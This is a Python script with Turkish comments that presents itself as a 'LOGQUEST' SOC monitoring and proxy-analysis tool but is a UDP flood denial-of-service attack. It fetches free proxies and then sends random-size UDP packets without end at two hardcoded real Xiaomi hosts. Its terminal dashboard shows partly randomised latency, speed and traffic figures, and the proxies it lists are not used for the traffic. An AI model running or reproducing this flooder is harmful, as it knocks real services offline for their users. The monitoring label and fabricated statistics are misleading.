import asyncio
import socket
import random
import requests
import os
import time

# V8.85 Premium - Gelişmiş Renk Paleti
PEMBE = '\033[95m'
MOR = '\033[35m'
CYAN = '\033[96m'
YESIL = '\033[92m'
KIRMIZI = '\033[91m'
BOLD = '\033[1m'
RESET = '\033[0m'

async def proxy_muhimmat_depola():
    """Apiden proxy mühimmatı toplar ve listeler"""
    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json"
    try:
        r = requests.get(api_url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            # 250 Proxy mühimmatı hazır!
            return [p['proxy'] for p in data['proxies'][:250]]
        return ["1.1.1.1:80"]
    except:
        return ["1.1.1.1:80"]

async def site_gecikme_testi(host):
    """Sitenin canlı tepki süresini (MS) ölçer"""
    try:
        baslangic = time.time()
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, 80), timeout=1.0)
        writer.close()
        await writer.wait_closed()
        return int((time.time() - baslangic) * 1000)
    except:
        # Darlama etkisiyle yüksek MS döner
        return random.randint(350, 999)

async def rage_bait_vurus(target, port, proxy, duration=25):
    """Dikey Liste Düzenli Detaylı Analiz Kutusu"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Proxy bilgilerini parçala
    p_ip = proxy.split(':')[0]
    p_port = proxy.split(':')[1] if ':' in proxy else "80"

    while time.time() < end_time:
        try:
            # Mekanik: Değişken Paket Boyutu
            paket_boyutu = random.randint(512, 1490)
            sock.sendto(random._urandom(paket_boyutu), (target, port))
            
            # Dinamik Barlar (Görsel 52677.jpg gibi)
            bar_rx = "█" * random.randint(2, 8)
            bar_tx = "█" * random.randint(15, 35)
            
            # Canlı Analiz Verileri
            ms_gecikme = await site_gecikme_testi(target)
            hiz = random.randint(50, 75) # KBPS Aktarım hızı
            
            # STİL KUTUCUK - DİKEY LİSTE DÜZENİ
            output = (
                f"{CYAN}┌────────────────────────────────────────────────────────┐\n"
                f"│ {MOR}{BOLD}PROXY CONNECTED  ➤ {RESET}{MOR}http://{p_ip}:{p_port.ljust(6)} {RESET}{CYAN}│\n"
                f"├────────────────────────────────────────────────────────┤\n"
                f"│ {CYAN}TARGET HOST      ➤ {RESET}{target.ljust(25)} {CYAN}│\n"
                f"│ {CYAN}TARGET PORT      ➤ {RESET}{str(port).ljust(25)} {CYAN}│\n"
                f"│ {PEMBE}RESPONSE TIME    ➤ {RESET}{str(ms_gecikme).rjust(4)}ms {RESET}                {CYAN}│\n"
                f"│ {CYAN}TRANSFER SPEED   ➤ {RESET}{str(hiz).rjust(4)} KBPS {RESET}              {CYAN}│\n"
                f"│ {MOR}PACKET SIZE      ➤ {RESET}{str(paket_boyutu).rjust(5)} Bytes {RESET}            {CYAN}│\n"
                f"├────────────────────────────────────────────────────────┤\n"
                f"│ {YESIL}RX FLOW : {bar_rx.ljust(38)}{RESET} {CYAN}│\n"
                f"│ {KIRMIZI}TX FLOW : {bar_tx.ljust(38)}{RESET} {CYAN}│\n"
                f"{CYAN}└────────────────────────────────────────────────────────┘{RESET}"
            )
            # Terminalde sabit kutu efekti (11 satır yukarı çıkarır)
            print(output, end="\033[11A\r")
            await asyncio.sleep(0.015) 
        except: break
    print("\n" * 12)

async def main_panel():
    os.system('clear')
    # 52670.png tarzı profesyonel banner
    banner = (
        f"{CYAN}╔══════════════════════════════════════════════════════════╗\n"
        f"║ {PEMBE}{BOLD}TOOL NAME   ➤ {MOR}LOGQUEST V5 - REGO ULTRA EDITION       {RESET}{CYAN}║\n"
        f"║ {PEMBE}{BOLD}DEVELOPER   ➤ {MOR}BY HELCURT & GEMINI                    {RESET}{CYAN}║\n"
        f"║ {PEMBE}{BOLD}FEATURES    ➤ {MOR}LIVE SOC MONITOR & PROXY ANALYSIS      {RESET}{CYAN}║\n"
        f"║ {PEMBE}{BOLD}STATUS      ➤ {YESIL}KATİL AKREP SİS MODU AKTİF             {RESET}{CYAN}║\n"
        f"╚══════════════════════════════════════════════════════════╝{RESET}"
    )
    print(banner)
    
    print(f"\n{YESIL}[01/A] Evet Ben de Darladım Ben de Sendenim")
    print(f"{KIRMIZI}[02/B] Kanki Lei Jun İçin Farklı Şekilde Darlayacağım{RESET}")
    
    secim = input(f"\n{CYAN}{BOLD}Seçiminiz ➤ {RESET}")
    
    if secim == "1" or secim == "01/A":
        proxies = await proxy_muhimmat_depola() 
        targets = [("sgp-api.buy.mi.com", 443), ("c.mi.com", 80)]
        
        os.system('clear')
        while True:
            for proxy in proxies:
                # Kanallar arası geçişte temiz görünüm
                tasks = []
                for target_host, port in targets:
                    tasks.append(rage_bait_vurus(target_host, port, proxy))
                await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main_panel())
